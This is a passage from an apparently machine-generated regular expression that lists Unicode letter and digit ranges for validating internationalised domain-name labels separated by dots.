fb13-\ufb17\ufb1d\ufb1f-\ufb28\ufb2a-\ufb36\ufb38-\ufb3c\ufb3e\ufb40\ufb41\ufb43\ufb44\ufb46-\ufbb1\ufbd3-\ufd3d\ufd50-\ufd8f\ufd92-\ufdc7\ufdf0-\ufdfb\ufe70-\ufe74\ufe76-\ufefc\uff21-\uff3a\uff41-\uff5a\uff66-\uffbe\uffc2-\uffc7\uffca-\uffcf\uffd2-\uffd7\uffda-\uffdc0-9\u0660-\u0669\u06f0-\u06f9\u07c0-\u07c9\u0966-\u096f\u09e6-\u09ef\u0a66-\u0a6f\u0ae6-\u0aef\u0b66-\u0b6f\u0be6-\u0bef\u0c66-\u0c6f\u0ce6-\u0cef\u0d66-\u0d6f\u0de6-\u0def\u0e50-\u0e59\u0ed0-\u0ed9\u0f20-\u0f29\u1040-\u1049\u1090-\u1099\u17e0-\u17e9\u1810-\u1819\u1946-\u194f\u19d0-\u19d9\u1a80-\u1a89\u1a90-\u1a99\u1b50-\u1b59\u1bb0-\u1bb9\u1c40-\u1c49\u1c50-\u1c59\ua620-\ua629\ua8d0-\ua8d9\ua900-\ua909\ua9d0-\ua9d9\ua9f0-\ua9f9\uaa50-\uaa59\uabf0-\uabf9\uff10-\uff19](?:[A-Za-z\\xAA\\xB5\\xBA\\xC0-\\xD6\\xD8-\\xF6\\xF8-\u02c1\u02c6-\u02d1\u02e0-\u02e4\u02ec\u02ee\u0370-\u0374\u0376\u0377\u037a-\u037d\u037f\u0386\u0388-\u038a\u038c\u038e-\u03a1\u03a3-\u03f5\u03f7-\u0481\u048a-\u052f\u0531-\u0556\u0559\u0561-\u0587\u05d0-\u05ea\u05f0-\u05f2\u0620-\u064a\u066e\u066f\u0671-\u06d3\u06d5\u06e5\u06e6\u06ee\u06ef\u06fa-\u06fc\u06ff\u0710\u0712-\u072f\u074d-\u07a5\u07b1\u07ca-\u07ea\u07f4\u07f5\u07fa\u0800-\u0815\u081a\u0824\u0828\u0840-\u0858\u08a0-\u08b4\u0904-\u0939\u093d\u0950\u0958-\u0961\u0971-\u0980\u0985-\u098c\u098f\u0990\u0993-\u09a8\u09aa-\u09b0\u09b2\u09b6-\u09b9\u09bd\u09ce\u09dc\u09dd\u09df-\u09e1\u09f0\u09f1\u0a05-\u0a0a\u0a0f\u0a10\u0a13-\u0a28\u0a2a-\u0a30\u0a32\u0a33\u0a35\u0a36\u0a38\u0a39\u0a59-\u0a5c\u0a5e\u0a72-\u0a74\u0a85-\u0a8d\u0a8f-\u0a91\u0a93-\u0aa8\u0aaa-\u0ab0\u0ab2\u0ab3\u0ab5-\u0ab9\u0abd\u0ad0\u0ae0\u0ae1\u0af9\u0b05-\u0b0c\u0b0f\u0b10\u0b13-\u0b28\u0b2a-\u0b30\u0b32\u0b33\u0b35-\u0b39\u0b3d\u0b5c\u0b5d\u0b5f-\u0b61\u0b71\u0b83\u0b85-\u0b8a\u0b8e-\u0b90\u0b92-\u0b95\u0b99\u0b9a\u0b9c\u0b9e\u0b9f\u0ba3\u0ba4\u0ba8-\u0baa\u0bae-\u0bb9\u0bd0\u0c05-\u0c0c\u0c0e-\u0c10\u0c12-\u0c28\u0c2a-\u0c39\u0c3d\u0c58-\u0c5a\u0c60\u0c61\u0c85-\u0c8c\u0c8e-\u0c90\u0c92-\u0ca8\u0caa-\u0cb3\u0cb5-\u0cb9\u0cbd\u0cde\u0ce0\u0ce1\u0cf1\u0cf2\u0d05-\u0d0c\u0d0e-\u0d10\u0d12-\u0d3a\u0d3d\u0d4e\u0d5f-\u0d61\u0d7a-\u0d7f\u0d85-\u0d96\u0d9a-\u0db1\u0db3-\u0dbb\u0dbd\u0dc0-\u0dc6\u0e01-\u0e30\u0e32\u0e33\u0e40-\u0e46\u0e81\u0e82\u0e84\u0e87\u0e88\u0e8a\u0e8d\u0e94-\u0e97\u0e99-\u0e9f\u0ea1-\u0ea3\u0ea5\u0ea7\u0eaa\u0eab\u0ead-\u0eb0\u0eb2\u0eb3\u0ebd\u0ec0-\u0ec4\u0ec6\u0edc-\u0edf\u0f00\u0f40-\u0f47\u0f49-\u0f6c\u0f88-\u0f8c\u1000-\u102a\u103f\u1050-\u1055\u105a-\u105d\u1061\u1065\u1066\u106e-\u1070\u1075-\u1081\u108e\u10a0-\u10c5\u10c7\u10cd\u10d0-\u10fa\u10fc-\u1248\u124a-\u124d\u1250-\u1256\u1258\u125a-\u125d\u1260-\u1288\u128a-\u128d\u1290-\u12b0\u12b2-\u12b5\u12b8-\u12be\u12c0\u12c2-\u12c5\u12c8-\u12d6\u12d8-\u1310\u1312-\u1315\u1318-\u135a\u1380-\u138f\u13a0-\u13f5\u13f8-\u13fd\u1401-\u166c\u166f-\u167f\u1681-\u169a\u16a0-\u16ea\u16f1-\u16f8\u1700-\u170c\u170e-\u1711\u1720-\u1731\u1740-\u1751\u1760-\u176c\u176e-\u1770\u1780-\u17b3\u17d7\u17dc\u1820-\u1877\u1880-\u18a8\u18aa\u18b0-\u18f5\u1900-\u191e\u1950-\u196d\u1970-\u1974\u1980-\u19ab\u19b0-\u19c9\u1a00-\u1a16\u1a20-\u1a54\u1aa7\u1b05-\u1b33\u1b45-\u1b4b\u1b83-\u1ba0\u1bae\u1baf\u1bba-\u1be5\u1c00-\u1c23\u1c4d-\u1c4f\u1c5a-\u1c7d\u1ce9-\u1cec\u1cee-\u1cf1\u1cf5\u1cf6\u1d00-\u1dbf\u1e00-\u1f15\u1f18-\u1f1d\u1f20-\u1f45\u1f48-\u1f4d\u1f50-\u1f57\u1f59\u1f5b\u1f5d\u1f5f-\u1f7d\u1f80-\u1fb4\u1fb6-\u1fbc\u1fbe\u1fc2-\u1fc4\u1fc6-\u1fcc\u1fd0-\u1fd3\u1fd6-\u1fdb\u1fe0-\u1fec\u1ff2-\u1ff4\u1ff6-\u1ffc\u2071\u207f\u2090-\u209c\u2102\u2107\u210a-\u2113\u2115\u2119-\u211d\u2124\u2126\u2128\u212a-\u212d\u212f-\u2139\u213c-\u213f\u2145-\u2149\u214e\u2183\u2184\u2c00-\u2c2e\u2c30-\u2c5e\u2c60-\u2ce4\u2ceb-\u2cee\u2cf2\u2cf3\u2d00-\u2d25\u2d27\u2d2d\u2d30-\u2d67\u2d6f\u2d80-\u2d96\u2da0-\u2da6\u2da8-\u2dae\u2db0-\u2db6\u2db8-\u2dbe\u2dc0-\u2dc6\u2dc8-\u2dce\u2dd0-\u2dd6\u2dd8-\u2dde\u2e2f\u3005\u3006\u3031-\u3035\u303b\u303c\u3041-\u3096\u309d-\u309f\u30a1-\u30fa\u30fc-\u30ff\u3105-\u312d\u3131-\u318e\u31a0-\u31ba\u31f0-\u31ff\u3400-\u4db5\u4e00-\u9fd5\ua000-\ua48c\ua4d0-\ua4fd\ua500-\ua60c\ua610-\ua61f\ua62a\ua62b\ua640-\ua66e\ua67f-\ua69d\ua6a0-\ua6e5\ua717-\ua71f\ua722-\ua788\ua78b-\ua7ad\ua7b0-\ua7b7\ua7f7-\ua801\ua803-\ua805\ua807-\ua80a\ua80c-\ua822\ua840-\ua873\ua882-\ua8b3\ua8f2-\ua8f7\ua8fb\ua8fd\ua90a-\ua925\ua930-\ua946\ua960-\ua97c\ua984-\ua9b2\ua9cf\ua9e0-\ua9e4\ua9e6-\ua9ef\ua9fa-\ua9fe\uaa00-\uaa28\uaa40-\uaa42\uaa44-\uaa4b\uaa60-\uaa76\uaa7a\uaa7e-\uaaaf\uaab1\uaab5\uaab6\uaab9-\uaabd\uaac0\uaac2\uaadb-\uaadd\uaae0-\uaaea\uaaf2-\uaaf4\uab01-\uab06\uab09-\uab0e\uab11-\uab16\uab20-\uab26\uab28-\uab2e\uab30-\uab5a\uab5c-\uab65\uab70-\uabe2\uac00-\ud7a3\ud7b0-\ud7c6\ud7cb-\ud7fb\uf900-\ufa6d\ufa70-\ufad9\ufb00-\ufb06\ufb13-\ufb17\ufb1d\ufb1f-\ufb28\ufb2a-\ufb36\ufb38-\ufb3c\ufb3e\ufb40\ufb41\ufb43\ufb44\ufb46-\ufbb1\ufbd3-\ufd3d\ufd50-\ufd8f\ufd92-\ufdc7\ufdf0-\ufdfb\ufe70-\ufe74\ufe76-\ufefc\uff21-\uff3a\uff41-\uff5a\uff66-\uffbe\uffc2-\uffc7\uffca-\uffcf\uffd2-\uffd7\uffda-\uffdc0-9\u0660-\u0669\u06f0-\u06f9\u07c0-\u07c9\u0966-\u096f\u09e6-\u09ef\u0a66-\u0a6f\u0ae6-\u0aef\u0b66-\u0b6f\u0be6-\u0bef\u0c66-\u0c6f\u0ce6-\u0cef\u0d66-\u0d6f\u0de6-\u0def\u0e50-\u0e59\u0ed0-\u0ed9\u0f20-\u0f29\u1040-\u1049\u1090-\u1099\u17e0-\u17e9\u1810-\u1819\u1946-\u194f\u19d0-\u19d9\u1a80-\u1a89\u1a90-\u1a99\u1b50-\u1b59\u1bb0-\u1bb9\u1c40-\u1c49\u1c50-\u1c59\ua620-\ua629\ua8d0-\ua8d9\ua900-\ua909\ua9d0-\ua9d9\ua9f0-\ua9f9\uaa50-\uaa59\uabf0-\uabf9\uff10-\uff19\\-]*[A-Za-z\\xAA\\xB5\\xBA\\xC0-\\xD6\\xD8-\\xF6\\xF8-\u02c1\u02c6-\u02d1\u02e0-\u02e4\u02ec\u02ee\u0370-\u0374\u0376\u0377\u037a-\u037d\u037f\u0386\u0388-\u038a\u038c\u038e-\u03a1\u03a3-\u03f5\u03f7-\u0481\u048a-\u052f\u0531-\u0556\u0559\u0561-\u0587\u05d0-\u05ea\u05f0-\u05f2\u0620-\u064a\u066e\u066f\u0671-\u06d3\u06d5\u06e5\u06e6\u06ee\u06ef\u06fa-\u06fc\u06ff\u0710\u0712-\u072f\u074d-\u07a5\u07b1\u07ca-\u07ea\u07f4\u07f5\u07fa\u0800-\u0815\u081a\u0824\u0828\u0840-\u0858\u08a0-\u08b4\u0904-\u0939\u093d\u0950\u0958-\u0961\u0971-\u0980\u0985-\u098c\u098f\u0990\u0993-\u09a8\u09aa-\u09b0\u09b2\u09b6-\u09b9\u09bd\u09ce\u09dc\u09dd\u09df-\u09e1\u09f0\u09f1\u0a05-\u0a0a\u0a0f\u0a10\u0a13-\u0a28\u0a2a-\u0a30\u0a32\u0a33\u0a35\u0a36\u0a38\u0a39\u0a59-\u0a5c\u0a5e\u0a72-\u0a74\u0a85-\u0a8d\u0a8f-\u0a91\u0a93-\u0aa8\u0aaa-\u0ab0\u0ab2\u0ab3\u0ab5-\u0ab9\u0abd\u0ad0\u0ae0\u0ae1\u0af9\u0b05-\u0b0c\u0b0f\u0b10\u0b13-\u0b28\u0b2a-\u0b30\u0b32\u0b33\u0b35-\u0b39\u0b3d\u0b5c\u0b5d\u0b5f-\u0b61\u0b71\u0b83\u0b85-\u0b8a\u0b8e-\u0b90\u0b92-\u0b95\u0b99\u0b9a\u0b9c\u0b9e\u0b9f\u0ba3\u0ba4\u0ba8-\u0baa\u0bae-\u0bb9\u0bd0\u0c05-\u0c0c\u0c0e-\u0c10\u0c12-\u0c28\u0c2a-\u0c39\u0c3d\u0c58-\u0c5a\u0c60\u0c61\u0c85-\u0c8c\u0c8e-\u0c90\u0c92-\u0ca8\u0caa-\u0cb3\u0cb5-\u0cb9\u0cbd\u0cde\u0ce0\u0ce1\u0cf1\u0cf2\u0d05-\u0d0c\u0d0e-\u0d10\u0d12-\u0d3a\u0d3d\u0d4e\u0d5f-\u0d61\u0d7a-\u0d7f\u0d85-\u0d96\u0d9a-\u0db1\u0db3-\u0dbb\u0dbd\u0dc0-\u0dc6\u0e01-\u0e30\u0e32\u0e33\u0e40-\u0e46\u0e81\u0e82\u0e84\u0e87\u0e88\u0e8a\u0e8d\u0e94-\u0e97\u0e99-\u0e9f\u0ea1-\u0ea3\u0ea5\u0ea7\u0eaa\u0eab\u0ead-\u0eb0\u0eb2\u0eb3\u0ebd\u0ec0-\u0ec4\u0ec6\u0edc-\u0edf\u0f00\u0f40-\u0f47\u0f49-\u0f6c\u0f88-\u0f8c\u1000-\u102a\u103f\u1050-\u1055\u105a-\u105d\u1061\u1065\u1066\u106e-\u1070\u1075-\u1081\u108e\u10a0-\u10c5\u10c7\u10cd\u10d0-\u10fa\u10fc-\u1248\u124a-\u124d\u1250-\u1256\u1258\u125a-\u125d\u1260-\u1288\u128a-\u128d\u1290-\u12b0\u12b2-\u12b5\u12b8-\u12be\u12c0\u12c2-\u12c5\u12c8-\u12d6\u12d8-\u1310\u1312-\u1315\u1318-\u135a\u1380-\u138f\u13a0-\u13f5\u13f8-\u13fd\u1401-\u166c\u166f-\u167f\u1681-\u169a\u16a0-\u16ea\u16f1-\u16f8\u1700-\u170c\u170e-\u1711\u1720-\u1731\u1740-\u1751\u1760-\u176c\u176e-\u1770\u1780-\u17b3\u17d7\u17dc\u1820-\u1877\u1880-\u18a8\u18aa\u18b0-\u18f5\u1900-\u191e\u1950-\u196d\u1970-\u1974\u1980-\u19ab\u19b0-\u19c9\u1a00-\u1a16\u1a20-\u1a54\u1aa7\u1b05-\u1b33\u1b45-\u1b4b\u1b83-\u1ba0\u1bae\u1baf\u1bba-\u1be5\u1c00-\u1c23\u1c4d-\u1c4f\u1c5a-\u1c7d\u1ce9-\u1cec\u1cee-\u1cf1\u1cf5\u1cf6\u1d00-\u1dbf\u1e00-\u1f15\u1f18-\u1f1d\u1f20-\u1f45\u1f48-\u1f4d\u1f50-\u1f57\u1f59\u1f5b\u1f5d\u1f5f-\u1f7d\u1f80-\u1fb4\u1fb6-\u1fbc\u1fbe\u1fc2-\u1fc4\u1fc6-\u1fcc\u1fd0-\u1fd3\u1fd6-\u1fdb\u1fe0-\u1fec\u1ff2-\u1ff4\u1ff6-\u1ffc\u2071\u207f\u2090-\u209c\u2102\u2107\u210a-\u2113\u2115\u2119-\u211d\u2124\u2126\u2128\u212a-\u212d\u212f-\u2139\u213c-\u213f\u2145-\u2149\u214e\u2183\u2184\u2c00-\u2c2e\u2c30-\u2c5e\u2c60-\u2ce4\u2ceb-\u2cee\u2cf2\u2cf3\u2d00-\u2d25\u2d27\u2d2d\u2d30-\u2d67\u2d6f\u2d80-\u2d96\u2da0-\u2da6\u2da8-\u2dae\u2db0-\u2db6\u2db8-\u2dbe\u2dc0-\u2dc6\u2dc8-\u2dce\u2dd0-\u2dd6\u2dd8-\u2dde\u2e2f\u3005\u3006\u3031-\u3035\u303b\u303c\u3041-\u3096\u309d-\u309f\u30a1-\u30fa\u30fc-\u30ff\u3105-\u312d\u3131-\u318e\u31a0-\u31ba\u31f0-\u31ff\u3400-\u4db5\u4e00-\u9fd5\ua000-\ua48c\ua4d0-\ua4fd\ua500-\ua60c\ua610-\ua61f\ua62a\ua62b\ua640-\ua66e\ua67f-\ua69d\ua6a0-\ua6e5\ua717-\ua71f\ua722-\ua788\ua78b-\ua7ad\ua7b0-\ua7b7\ua7f7-\ua801\ua803-\ua805\ua807-\ua80a\ua80c-\ua822\ua840-\ua873\ua882-\ua8b3\ua8f2-\ua8f7\ua8fb\ua8fd\ua90a-\ua925\ua930-\ua946\ua960-\ua97c\ua984-\ua9b2\ua9cf\ua9e0-\ua9e4\ua9e6-\ua9ef\ua9fa-\ua9fe\uaa00-\uaa28\uaa40-\uaa42\uaa44-\uaa4b\uaa60-\uaa76\uaa7a\uaa7e-\uaaaf\uaab1\uaab5\uaab6\uaab9-\uaabd\uaac0\uaac2\uaadb-\uaadd\uaae0-\uaaea\uaaf2-\uaaf4\uab01-\uab06\uab09-\uab0e\uab11-\uab16\uab20-\uab26\uab28-\uab2e\uab30-\uab5a\uab5c-\uab65\uab70-\uabe2\uac00-\ud7a3\ud7b0-\ud7c6\ud7cb-\ud7fb\uf900-\ufa6d\ufa70-\ufad9\ufb00-\ufb06\ufb13-\ufb17\ufb1d\ufb1f-\ufb28\ufb2a-\ufb36\ufb38-\ufb3c\ufb3e\ufb40\ufb41\ufb43\ufb44\ufb46-\ufbb1\ufbd3-\ufd3d\ufd50-\ufd8f\ufd92-\ufdc7\ufdf0-\ufdfb\ufe70-\ufe74\ufe76-\ufefc\uff21-\uff3a\uff41-\uff5a\uff66-\uffbe\uffc2-\uffc7\uffca-\uffcf\uffd2-\uffd7\uffda-\uffdc0-9\u0660-\u0669\u06f0-\u06f9\u07c0-\u07c9\u0966-\u096f\u09e6-\u09ef\u0a66-\u0a6f\u0ae6-\u0aef\u0b66-\u0b6f\u0be6-\u0bef\u0c66-\u0c6f\u0ce6-\u0cef\u0d66-\u0d6f\u0de6-\u0def\u0e50-\u0e59\u0ed0-\u0ed9\u0f20-\u0f29\u1040-\u1049\u1090-\u1099\u17e0-\u17e9\u1810-\u1819\u1946-\u194f\u19d0-\u19d9\u1a80-\u1a89\u1a90-\u1a99\u1b50-\u1b59\u1bb0-\u1bb9\u1c40-\u1c49\u1c50-\u1c59\ua620-\ua629\ua8d0-\ua8d9\ua900-\ua909\ua9d0-\ua9d9\ua9f0-\ua9f9\uaa50-\uaa59\uabf0-\uabf9\uff10-\uff19])?\\.)*(?:[A-Za-z\\xAA\\xB5\\xBA\\xC0-\\xD6\\xD8-\\xF6\\xF8-\u02c1\u02c6-\u02d1\u02e0-\u02e4\u02ec\u02ee\u0370-\u0374\u0376\u0377\u037a-\u037d\u037f\u0386\u0388-\u038a\u038c\u038e-\u03a1\u03a3-\u03f5\u03f7-\u0481\u048a-\u052f\u0531-\u0556\u0559\u0561-\u0587\u05d0-\u05ea\u05f0-\u05f2\u0620-\u064a\u066e\u066f\u0671-\u06d3\u06d5\u06e5\u06e6\u06ee\u06ef\u06fa-\u06fc\u06ff\u0710\u0712-\u072f\u074d-\u07a5\u07b1\u07ca-\u07ea\u07f4\u07f5\u07fa\u0800-\u0815\u081a\u0824\u0828\u0840-\u0858\u08a0-\u08b4\u0904-\u0939\u093d\u0950\u0958-\u0961\u0971-\u0980\u0985-\u098c\u098f\u0990\u0993-\u09a8\u09aa-\u09b0\u09b2\u09b6-\u09b9\u09bd\u09ce\u09dc\u09dd\u09df-\u09e1\u09f0\u09f1\u0a05-\u0a0a\u0a0f\u0a10\u0a13-\u0a28\u0a2a-\u0a30\u0a32\u0a33\u0a35\u0a36\u0a38\u0a39\u0a59-\u0a5c\u0a5e\u0a72-\u0a74\u0a85-\u0a8d\u0a8f-\u0a91\u0a93-\u0aa8\u0aaa-\u0ab0\u0ab2\u0ab3\u0ab5-\u0ab9\u0abd\u0ad0\u0ae0\u0ae1\u0af9\u0b05-\u0b0c\u0b0f\u0b10\u0b13-\u0b28\u0b2a-\u0b30\u0b32\u0b33\u0b35-\u0b39\u0b3d\u0b5c\u0b5d\u0b5f-\u0b61\u0b71\u0b83\u0b85-\u0b8a\u0b8e-\u0b90\u0b92-\u0b95\u0b99\u0b9a\u0b9c\u0b9e\u0b9f\u0ba3\u0ba4\u0ba8-\u0baa\u0bae-\u0bb9\u0bd0\u0c05-\u0c0c\u0c0e-\u0c10\u0c12-\u0c28\u0c2a-\u0c39\u0c3d\u0c58-\u0c5a\u0c60\u0c61\u0c85-\u0c8c\u0c8e-\u0c90\u0c92-\u0ca8\u0caa-\u0cb3\u0cb5-\u0cb9\u0cbd\u0cde\u0ce0\u0ce1\u0cf1\u0cf2\u0d05-\u0d0c\u0d0e-\u0d10\u0d12-\u0d3a\u0d3d\u0d4e\u0d5f-\u0d61\u0d7a-\u0d7f\u0d85-\u0d96\u0d9a-\u0db1\u0db3-\u0dbb\u0dbd\u0dc0-\u0dc6\u0e01-\u0e30\u0e32\u0e33\u0e40-\u0e46\u0e81\u0e82\u0e84\u0e87\u0e88\u0e8a\u0e8d\u0e94-\u0e97\u0e99-\u0e9f\u0ea1-\u0ea3\u0ea5\u0ea7\u0eaa\u0eab\u0ead-\u0eb0\u0eb2\u0eb3\u0ebd\u0ec0-\u0ec4\u0ec6\u0edc-\u0edf\u0f00\u0f40-\u0f47\u0f49-\u0f6c\u0f88-\u0f8c\u1000-\u102a\u103f\u1050-\u1055\u105a-\u105d\u1061\u1065\u1066\u106e-\u1070\u1075-\u1081\u108e\u10a0-\u10c5\u10c7\u10cd\u10d0-\u10fa\u10fc-\u1248\u124a-\u124d\u1250-\u1256\u1258\u125a-\u125d\u1260-\u1288\u128a-\u128d\u1290-\u12b0\u12b2-\u12b5\u12b8-\u12be\u12c0\u12c2-\u12c5\u12c8-\u12d6\u12d8-\u1310\u1312-\u1315\u1318-\u135a\u1380-\u138f\u13a0-\u13f5\u13f8-\u13fd\u1401-\u166c\u166f-\u167f\u1681-\u169a\u16a0-\u16ea\u16f1-\u16f8\u1700-\u170c\u170e-\u1711\u1720-\u1731\u1740-\u1751\u1760-\u176c\u176e-\u1770\u1780-\u17b3\u17d7\u17dc\u1820-\u1877\u1880-\u18a8\u18aa\u18b0-\u18f5\u1900-\u191e\u1950-\u196d\u1970-\u1974\u1980-\u19ab\u19b0-\u19c9\u1a00-\u1a16\u1a20-\u1a54\u1aa7\u1b05-\u1b33\u1b45-\u1b4b\u1b83-\u1ba0\u1bae\u1baf\u1bba-\u1be5\u1c00-\u1c23\u1c4d-\u1c4f\u1c5a-\u1c7d\u1ce9-\u1cec\u1cee-\u1cf1\u1cf5\u1cf6\u1d00-\u1dbf\u1e00-\u1f15\u1f18-\u1f1d\u1f20-\u1f45\u1f48-\u1f4d\u1f50-\u1f57\u1f59\u1f5b\u1f5d\u1f5f-\u1f7d\u1f80-\u1fb4\u1fb6-\u1fbc\u1fbe\u1fc2-\u1fc4\u1fc6-\u1fcc\u1fd0-\u1fd3\u1fd6-\u1fdb\u1fe0-\u1fec\u1ff2-\u1ff4\u1ff6-\u1ffc\u2071\u207f\u2090-\u209c\u2102\u2107\u210a-\u2113\u2115\u2119-\u211d\u2124\u2126\u2128\u212a-\u212d\u212f-\u2139\u213c-\u213f\u2145-\u2149\u214e\u2183\u2184\u2c00-\u2c2e\u2c30-\u2c5e\u2c60-\u2ce4\u2ceb-\u2cee\u2cf2\u2cf3\u2d00-\u2d25\u2d27\u2d2d\u2d30-\u2d67\u2d6f\u2d80-\u2d96\u2da0-\u2da6\u2da8-\u2dae\u2db0-\u2db6\u2db8-\u2dbe\u2dc0-\u2dc6\u2dc8-\u2dce\u2dd0-\u2dd6\u2dd8-\u2dde\u2e2f\u3005\u3006\u3031-\u3035\u303b\u303c\u3041-\u3096\u309d-\u309f\u30a1-\u30fa\u30fc-\u30ff\u3105-\u312d\u3131-\u318e\u31a0-\u31ba\u31f0-\u31ff\u3400-\u4db5\u4e00-\u9fd5\ua000-\ua48c\ua4d0-\ua4fd\ua500-\ua60c\ua610-\ua61f\ua62a\ua62b\ua640-\ua66e\ua67f-\ua69d\ua6a0-\ua6e5\ua717-\ua71f\ua722-\ua788\ua78b-\ua7ad\ua7b0-\ua7b7\ua7f7-\ua801\ua803-\ua805\ua807-\ua80a\ua80c-\ua822\ua840-\ua873\ua882-\ua8b3\ua8f2-\ua8f7\ua8fb\ua8fd\ua90a-\ua925\ua930-\ua946\ua960-\ua97c\ua984-\ua9b2\ua9cf\ua9e0-\ua9e4\ua9e6-\ua9ef\ua9fa-\ua9fe\uaa00-\uaa28\uaa40-\uaa42\uaa44-\uaa4b\uaa60-\uaa76\uaa7a\uaa7e-\uaaaf\uaab1\uaab5\uaab6\uaab9-\uaabd\uaac0\uaac2\uaadb-\uaadd\uaae0-\uaaea\uaaf2-\uaaf4\uab01-\uab06\uab09-\uab0e\uab11-\uab16\uab20-\uab26\uab28-\uab2e\uab30-\uab5a\uab5c-\uab65\uab70-\uabe2\uac00-\ud7a3\ud7b0-\ud7c6\ud7cb-\ud7fb\uf900-\ufa6d\ufa70-\ufad9\ufb00-\ufb06\ufb13-\ufb17\ufb1d\ufb1f-\ufb28\ufb2a-\ufb36\ufb38-\ufb3c\ufb3e\ufb40\ufb41\ufb43\ufb44\ufb46-\ufbb1\ufbd3-\ufd3d\ufd50-\ufd8f\ufd92-\ufdc7\ufdf0-\ufdfb\ufe70-\ufe74\ufe76-\ufefc\uff21-\uff3a\uff41-\uff5a\uff66-\uffbe\uffc2-\uffc7\uffca-\uffcf\uffd2-\uffd7\uffda-\uffdc0-9\u0660-\u0669\u06f0-\u06f9\u07c0-\u07c9\u0966-\u096f\u09e6-\u09ef\u0a66-\u0a6f\u0ae6-\u0aef\u0b66-\u0b6f\u0be6-\u0bef\u0c66-\u0c6f\u0ce6-\u0cef\u0d66-\u0d6f\u0de6-\u0def\u0e50-\u0e59\u0ed0-\u0ed9\u0f20-\u0f29\u1040-\u1049\u1090-\u1099\u17e0-\u17e9\u1810-\u1819\u1946-\u194f\u19d0-\u19d9\u1a80-\u1a89\u1a90-\u1a99\u1b50-\u1b59\u1bb0-\u1bb9\u1c40-\u1c49\u1c50-\u1c59\ua620-\ua629\ua8d0-\ua8d9\ua900-\ua909\ua9d0-\ua9d9\ua9f0-\ua9f9\uaa50-\uaa59\uabf0-\uabf9\uff10-\uff19](?:[A-Za-z\\xAA\\xB5\\xBA\\xC0-\\xD6\\xD8-\\xF6\\xF8-\u02c1\u02c6-\u02d1\u02e0-\u02e4\u02ec\u02ee\u0370-\u0374\u0376\u0377\u037a-\u037d\u037f\u0386\u0388-\u038a\u038c\u038e-\u03a1\u03a3-\u03f5\u03f7-\u0481\u048a-\u052f\u0531-\u0556\u0559\u0561-\u0587\u05d0-\u05ea\u05f0-\u05f2\u0620-\u064a\u066e\u066f\u0671-\u06d3\u06d5\u06e5\u06e6\u06ee\u06ef\u06fa-\u06fc\u06ff\u0710\u0712-\u072f\u074d-\u07a5\u07b1\u07ca-\u07ea\u07f4\u07f5\u07fa\u0800-\u0815\u081a\u0824\u0828\u0840-\u0858\u08a0-\u08b4\u0904-\u0939\u093d\u0950\u0958-\u0961\u0971-\u0980\u0985-\u098c\u098f\u0990\u0993-\u09a8\u09aa-\u09b0\u09b2\u09b6-\u09b9\u09bd\u09ce\u09dc\u09dd\u09df-\u09e1\u09f0\u09f1\u0a05-\u0a0a\u0a0f\u0a10\u0a13-\u0a28\u0a2a-\u0a30\u0a32\u0a33\u0a35\u0a36\u0a38\u0a39\u0a59-\u0a5c\u0a5e\u0a72-\u0a74\u0a85-\u0a8d\u0a8f-\u0a91\u0a93-\u0aa8\u0aaa-\u0ab0\u0ab2\u0ab3\u0ab5-\u0ab9\u0abd\u0ad0\u0ae0\u0ae1\u0af9\u0b05-\u0b0c\u0b0f\u0b10\u0b13-\u0b28\u0b2a-\u0b30\u0b32\u0b33\u0b35-\u0b39\u0b3d\u0b5c\u0b5d\u0b5f-\u0b61\u0b71\u0b83\u0b85-\u0b8a\u0b8e-\u0b90\u0b92-\u0b95\u0b99\u0b9a\u0b9c\u0b9e\u0b9f\u0ba3\u0ba4\u0ba8-\u0baa\u0bae-\u0bb9\u0bd0\u0c05-\u0c0c\u0c0e-\u0c10\u0c12-\u0c28\u0c2a-\u0c39\u0c3d\u0c58-\u0c5a\u0c60\u0c61\u0c85-\u0c8c\u0c8e-\u0c90\u0c92-\u0ca8\u0caa-\u0cb3\u0cb5-\u0cb9\u0cbd\u0cde\u0ce0\u0ce1\u0cf1\u0cf2\u0d05-\u0d0c\u0d0e-\u0d10\u0d12-\u0d3a\u0d3d\u0d4e\u0d5f-\u0d61\u0d7a-\u0d7f\u0d85-\u0d96\u0d9a-\u0db1\u0db3-\u0dbb\u0dbd\u0dc0-\u0dc6\u0e01-\u0e30\u0e32\u0e33\u0e40-\u0e46\u0e81\u0e82\u0e84\u0e87\u0e88\u0e8a\u0e8d\u0e94-\u0e97\u0e99-\u0e9f\u0ea1-\u0ea3\u0ea5\u0ea7\u0eaa\u0eab\u0ead-\u0eb0\u0eb2\u0eb3\u0ebd\u0ec0-\u0ec4\u0ec6\u0edc-\u0edf\u0f00\u0f40-\u0f47\u0f49-\u0f6c\u0f88-\u0f8c\u1000-\u102a\u103f\u1050-\u1055\u105a-\u105d\u1061\u1065\u1066\u106e-\u1070\u1075-\u1081\u108e\u10a0-\u10c5\u10c7\u10cd\u10d0-\u10fa\u10fc-\u1248\u124a-\u124d\u1250-\u1256\u1258\u125a-\u125d\u1260-\u1288\u128a-\u128d\u1290-\u12b0\u12b2-\u12b5\u12b8-\u12be\u12c0\u12c2-\u12c5\u12c8-\u12d6\u12d8-\u1310\u1312-\u1315\u1318-\u135a\u1380-\u138f\u13a0-\u13f5\u13f8-\u13fd\u1401-\u166c\u166f-\u167f\u1681-\u169a\u16a0-\u16ea\u16f1-\u16f8\u1700-\u170c\u170e-\u1711\u1720-\u1731\u1740-\u1751\u1760-\u176c\u176e-\u1770\u1780-\u17b3\u17d7\u17dc\u1820-\u1877\u1880-\u18a8\u18aa\u18b0-\u18f5\u1900-\u191e\u1950-\u196d\u1970-\u1974\u1980-\u19ab\u19b0-\u19c9\u1a00-\u1a16\u1a20-\u1a54\u1aa7\u1b05-\u1b33\u1b45-\u1b4b\u1b83-\u1ba0\u1bae\u1baf\u1bba-\u1be5\u1c00-\u1c23\u1c4d-\u1c4f\u1c5a-\u1c7d\u1ce9-\u1cec\u1cee-\u1cf1\u1cf5\u1cf6\u1d00-\u1dbf\u1e00-\u1f15\u1f18-\u1f1d\u1f20-\u1f45\u1f48-\u1f4d\u1f50-\u1f57\u1f59\u1f5b\u1f5d\u1f5f-\u1f7d\u1f80-\u1fb4\u1fb6-\u1fbc\u1fbe\u1fc2-\u1fc4\u1fc6-\u1fcc\u1fd0-\u1fd3\u1fd6-\u1fdb\u1fe0-\u1fec\u1ff2-\u1ff4\u1ff6-\u1ffc\u2071\u207f\u2090-\u209c\u2102\u2107\u210a-\u2113\u2115\u2119-\u211d\u2124\u2126\u2128\u212a-\u212d\u212f-\u2139\u213c-\u213f\u2145-\u2149\u214e\u2183\u2184\u2c00-\u2c2e\u2c30-